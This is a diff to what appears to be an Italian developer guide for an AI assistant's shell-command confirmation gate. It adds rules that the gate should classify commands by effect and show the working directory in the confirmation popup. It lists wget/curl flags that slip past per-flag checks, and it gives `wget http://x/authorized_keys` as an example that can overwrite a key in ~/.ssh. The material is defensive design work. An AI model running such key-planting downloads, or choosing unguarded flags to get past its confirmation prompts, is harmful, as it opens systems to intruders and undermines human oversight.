@@ -162,6 +162,26 @@ il livello non viene eseguito.
   l'impostazione e cosa si rischia a toccarla. `describe()` compone
   label + `risk`, e il popup mostra entrambi. Un setter di livello 2 senza
   `risk` è un bug: lo intercetta `tests/unit/preferences.test.mjs`.
+- **Il livello guarda l'EFFETTO, non il nome del flag (#284 → #479).** Nei
+  comandi shell (`src/shared/cmdClassify.js`) è la tentazione ricorrente:
+  riconoscere il flag che si è visto nella segnalazione e chiamarla fatta. Ma
+  `curl` senza `-o` stampa a schermo mentre `wget` senza flag scrive comunque un
+  file, quindi la stessa regola sui due programmi lascia scoperta la strada
+  equivalente. Formula la regola come invariante sull'effetto ("se scarica dalla
+  rete e fa atterrare un file su disco, allora conferma rigorosa") e poi verifica
+  che copra le strade che non hai visto: `-P` sceglie la cartella invece del
+  nome, `-c`/`-N` accodano o sovrascrivono un file già lì, `-K` prende le opzioni
+  da un file. Un check per flag si aggira con un altro flag.
+- **La conferma dice il CONTESTO che nel comando non si legge (#479).** La
+  cartella di lavoro dell'assistente è persistente e la sposta lui con un `cd`
+  (livello 1: nessuna conferma), quindi `wget http://x/authorized_keys` è
+  innocuo nella home e sovrascrive una chiave dentro `~/.ssh` con lo stesso
+  identico testo. Il main inietta la cartella come `_cwd` prima del gate e
+  `describe()` la scrive nel popup, come già fa con `_targets`/`_illegible`. Due
+  vincoli: il contesto è solo TESTO e non tocca mai il livello (quello lo decide
+  il comando), e va abbreviato per la lettura (`~/.ssh`, non
+  `/home/mario/.ssh`), che tiene anche il nome utente fuori da un popup disegnato
+  dentro una pagina web qualsiasi.
 - **UI:** le conferme usano i componenti riusabili `SN_CONFIRM_UI.confirm`
   (livello 2) e `SN_CONFIRM_UI.confirmTyped` (livello 3) in
   `src/shared/confirmUi.js` — mai `window.confirm` nativo.
